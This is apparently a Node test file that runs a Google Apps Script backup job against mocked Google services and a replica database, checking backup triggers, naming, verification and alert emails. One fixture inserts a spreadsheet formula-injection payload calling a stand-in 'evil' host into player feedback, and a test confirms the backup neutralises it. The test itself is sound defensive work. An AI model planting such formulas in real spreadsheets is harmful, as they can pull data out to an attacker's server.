// Runs ops/backup/Code.gs in Node against mocked Google services and a real snapshot from the replica database.
import { makeDb, newUser } from "./harness.mjs";
import { readFileSync } from "node:fs";
import { createHash } from "node:crypto";
import vm from "node:vm";
const MIG = new URL("../migrations", import.meta.url).pathname;
const CODE = readFileSync(new URL("../../ops/backup/Code.gs", import.meta.url), "utf8");
let pass = 0, fail = 0;
const ok = (n, c, x = "") => { c ? pass++ : fail++; console.log(`${c ? "  ok  " : "  FAIL"} ${n}${!c && x ? " — " + x : ""}`); };

// --- a real snapshot from the replica
const db = await makeDb(MIG);
for (let i = 0; i < 7; i++) await newUser(db, `Player ${i}`);
await db.query(`insert into public.feedback (user_id, target_kind, rating, comment, page) values (null, 'site', 5, '=IMPORTXML("http://evil","//a")', 'home')`);
await db.query(`insert into public.ratings (user_id, field, score, entries, history) select id, 'data', 640, 1, array[640] from auth.users`);
let tokenHash = null;
const rpcDb = async (fn, token) => {
  if (!tokenHash) { tokenHash = createHash("sha256").update(token).digest("hex"); await db.query(`select public.set_backup_token_hash($1)`, [tokenHash]); }
  await db.query(`update public.backup_config set last_snapshot_at = null, last_status_at = null`);
  await db.exec(`select set_config('request.jwt.claims', '{"role":"anon"}', false); set role anon;`);
  try { return (await db.query(`select public.${fn}($1) r`, [token])).rows[0].r; } finally { await db.exec("reset role"); }
};

// --- mocks
function makeEnv({ corruptTab = null } = {}) {
  const props = {}, files = [], mails = [], patched = [], triggers = [];
  let nextId = 1;
  const mkSheet = (name) => { const cells = {}; let last = 0; const sh = {
    name, cells, setName(n) { sh.name = n; return sh; }, getLastRow: () => last, setFrozenRows() {},
    appendRow(r) { last++; r.forEach((v, j) => cells[`${last},${j + 1}`] = v); },
    getRange(r, c, nr = 1, nc = 1) { const rg = {
      setNumberFormat: () => rg, setFontWeight: () => rg,
      setValue(v) { cells[`${r},${c}`] = v; last = Math.max(last, r); return rg; },
      setValues(vals) { let rows = vals; if (corruptTab && sh.name === corruptTab && r > 1) rows = vals.slice(0, -1);
        rows.forEach((row, i) => row.forEach((v, j) => cells[`${r + i},${c + j}`] = v)); if (rows.length) last = Math.max(last, r + rows.length - 1); return rg; } }; return rg; } }; return sh; };
  const mkSS = (title) => { const id = `ss${nextId++}`; const sheets = [mkSheet("Sheet1")]; const ss = { id, title, sheets,
    getId: () => id, getUrl: () => `https://docs/${id}`, rename(t) { ss.title = t; }, getSheets: () => sheets,
    insertSheet(n) { const s = mkSheet(n); sheets.push(s); return s; }, getSheetByName: n => sheets.find(s => s.name === n) };
    files.push({ id, kind: "sheet", ss, folder: null }); return ss; };
  const folder = { name: "Rank Culture backups", getFilesByName: n => { const f = files.filter(x => x.folder === folder && (x.ss ? x.ss.title : x.name) === n); let i = 0; return { hasNext: () => i < f.length, next: () => f[i++] }; },
    createFile(blob) { const f = { id: `f${nextId++}`, kind: "xlsx", name: blob.name, size: blob.size, folder, getId() { return this.id; }, getUrl() { return `https://drive/${this.id}`; } }; files.push(f); return f; } };
  let folderMade = false;
  const ctx = {
    console, JSON, Math, Number, String, Object, Date, Error,
    Logger: { log: () => {} },
    PropertiesService: { getScriptProperties: () => ({ getProperty: k => props[k] ?? null, setProperty: (k, v) => { props[k] = v; } }) },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock() {} }) },
    Utilities: { getUuid: () => crypto.randomUUID(), formatDate: () => "2026-11-12 0300", DigestAlgorithm: { SHA_256: 1 }, Charset: { UTF_8: 1 },
      computeDigest: (_a, s) => [...createHash("sha256").update(s).digest()].map(b => (b > 127 ? b - 256 : b)) },
    SpreadsheetApp: { create: t => mkSS(t), flush() {}, open: f => f.ss },
    DriveApp: { getFileById: id => ({ moveTo(fd) { files.find(f => f.id === id).folder = fd; } }),
      getFoldersByName: () => ({ hasNext: () => folderMade, next: () => folder }), createFolder: () => { folderMade = true; return folder; } },
    ScriptApp: { getOAuthToken: () => "tok", getProjectTriggers: () => triggers, deleteTrigger() {}, WeekDay: { SUNDAY: 0 },
      newTrigger: n => { const b = { timeBased: () => b, everyHours: () => b, onWeekDay: () => b, atHour: () => b, create: () => triggers.push(n) }; return b; } },
    MailApp: { sendEmail: (to, subj, body) => mails.push({ subj, body }) },
    Session: { getEffectiveUser: () => ({ getEmail: () => "me@example.com" }) },
    UrlFetchApp: { fetch: (url, opt) => {
      if (url.includes("/rest/v1/rpc/")) { const fn = url.split("/rpc/")[1]; const tok = JSON.parse(opt.payload).p_token; return { __async: rpcDb(fn, tok) }; }
      if (url.includes("export?format=xlsx")) return { getResponseCode: () => 200, getBlob: () => { const b = { name: "", size: 8000, setName(n) { b.name = n; return b; }, getBytes: () => ({ length: 8000 }) }; return b; } };
      if (url.includes("/drive/v3/files/")) { patched.push(url); return { getResponseCode: () => 200 }; }
      throw new Error("unexpected url " + url); } },
  };
  return { ctx, props, files, mails, patched, triggers };
}

// Apps Script is synchronous; the mock database is async. Pre-resolve RPCs by running the script with an awaited fetch.
async function run(env, fnName) {
  const IO = "rpc_|backup_|checkAndBackup|weeklyBackup|backupNow|setup|exportXlsx_|lockReadOnly_|log_|writeTab_|folder_";
  const asyncCode = CODE.replace(new RegExp(`function (${IO})\\(`, "g"), "async function $1(")
    .replace(/\b(rpc_|backup_|checkAndBackup|weeklyBackup|backupNow|setup|exportXlsx_|lockReadOnly_|log_|writeTab_|folder_)\(/g, "await $1(")
    .replace(/async function await /g, "async function ")
    .replace(/const res = UrlFetchApp\.fetch\(/g, "const res = await fetch_(")
    .replace(/\.forEach\(tab => \{\n\s+const rows = \(snap/, ".forEach(async tab => {\n      const rows = (snap");
  // For loops with awaits inside forEach, rewrite the two forEach writers into for…of.
  const code = asyncCode
    .replace(/CFG\.tabs\.forEach\(async tab => \{\n(\s+)const rows = \(snap\.tables && snap\.tables\[tab\]\) \|\| \[\];\n\s+counts\[tab\] = rows\.length;\n\s+await writeTab_\(ss\.insertSheet\(tab\), rows\);\n\s+\}\);/,
      "for (const tab of CFG.tabs) { const rows = (snap.tables && snap.tables[tab]) || []; counts[tab] = rows.length; await writeTab_(ss.insertSheet(tab), rows); }");
  const ctx = vm.createContext({ ...env.ctx, fetch_: async (u, o) => { const r = env.ctx.UrlFetchApp.fetch(u, o); if (r.__async) { const data = await r.__async; return { getResponseCode: () => 200, getContentText: () => JSON.stringify(data) }; } return r; } });
  vm.runInContext(code, ctx);
  return vm.runInContext(`${fnName}()`, ctx);
}

console.log("Backup script (ops/backup/Code.gs)");
const env = makeEnv();
const hash = await run(env, "setup");
ok("setup stores a 96-char token and returns its SHA-256", env.props.BACKUP_TOKEN.length === 96 && hash === createHash("sha256").update(env.props.BACKUP_TOKEN).digest("hex"));
ok("setup creates the hourly and weekly timers", env.triggers.join(",") === "checkAndBackup,weeklyBackup");
await run(env, "checkAndBackup");
const sheets = env.files.filter(f => f.kind === "sheet" && f.ss.title.startsWith("Rank Culture backup 2026"));
ok("first hourly check takes a backup", sheets.length === 1, env.files.map(f => f.ss ? f.ss.title : f.name).join(" | "));
const bk = sheets[0].ss;
ok("backup is named with time and user count", bk.title === "Rank Culture backup 2026-11-12 0300 IST — 7 users", bk.title);
ok("one tab per table + summary", bk.sheets.length === 12 && bk.sheets[0].name === "summary");
ok("users tab has 7 rows + header", bk.getSheetByName("users").getLastRow() === 8);
const fb = bk.getSheetByName("feedback"); const fbCells = Object.values(fb.cells);
ok("formula in player feedback is neutralised", fbCells.includes(`'=IMPORTXML("http://evil","//a")`) && !fbCells.some(v => v === `=IMPORTXML("http://evil","//a")`));
ok("an .xlsx copy is saved in the folder", env.files.some(f => f.kind === "xlsx" && f.name.endsWith("7 users.xlsx") && f.folder));
ok("both files are locked read-only", env.patched.length === 2);
ok("log records an OK backup", (() => { const log = env.files.find(f => f.ss && f.ss.title === "Rank Culture backup log"); return log && log.ss.sheets[0].cells["2,3"] === "OK"; })());
ok("last backed-up sign-up count saved", env.props.LAST_BACKUP_SIGNUPS === "7");
const before = env.files.length;
await run(env, "checkAndBackup");
ok("no new backup until the next multiple of 50", env.files.length === before);
for (let i = 0; i < 43; i++) await newUser(db, `New ${i}`);
await run(env, "checkAndBackup");
ok("reaching 50 sign-ups triggers a backup", env.files.some(f => f.ss && f.ss.title.endsWith("— 50 users")));
ok("earlier backup untouched", bk.title.endsWith("7 users") && bk.getSheetByName("users").getLastRow() === 8);

const bad = makeEnv({ corruptTab: "ratings" });
bad.props.BACKUP_TOKEN = env.props.BACKUP_TOKEN;
let threw = false; try { await run(bad, "backupNow"); } catch (e) { threw = /verification failed on tab "ratings"/.test(e.message); }
ok("a backup that doesn't match the data fails verification", threw);
ok("…the file is renamed FAILED, not deleted", bad.files.some(f => f.ss && f.ss.title.startsWith("FAILED — Rank Culture backup")));
ok("…an alert email is sent", bad.mails.length === 1 && /FAILED/.test(bad.mails[0].subj));
ok("…and the last good count is not advanced", bad.props.LAST_BACKUP_SIGNUPS === undefined);

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
